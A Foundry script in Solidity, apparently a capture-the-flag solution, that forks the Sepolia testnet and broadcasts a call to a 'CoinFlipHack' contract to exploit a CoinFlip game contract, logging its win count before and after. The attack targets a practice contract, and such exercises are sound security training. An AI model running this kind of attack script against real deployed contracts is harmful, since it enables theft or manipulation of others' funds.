// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {CoinFlip, CoinFlipHack} from "../src/CoinFlip.sol";

contract FallbackScript is Script {
    function setUp() public {}

    function run() public {
        hackContract();
    }

    function hackContract() internal {
        uint256 sepolia = vm.createFork(vm.rpcUrl("sepolia"));

        address CoinFlipAddress = 0x86670978dec5b121743375bb091500D0dE4b593E;

        address CoinHack = 0xaF2901341d2E95c1178b8D191f6CD7727dAFa31d;

        vm.selectFork(sepolia);

        vm.startBroadcast();

        console.log("Starting Hacking");

        console.log("Initial Count:", CoinFlip(CoinFlipAddress).consecutiveWins());

        CoinFlipHack(CoinHack).hack(CoinFlipAddress);

        console.log("Final Count:", CoinFlip(CoinFlipAddress).consecutiveWins());

        vm.stopBroadcast();
    }
}
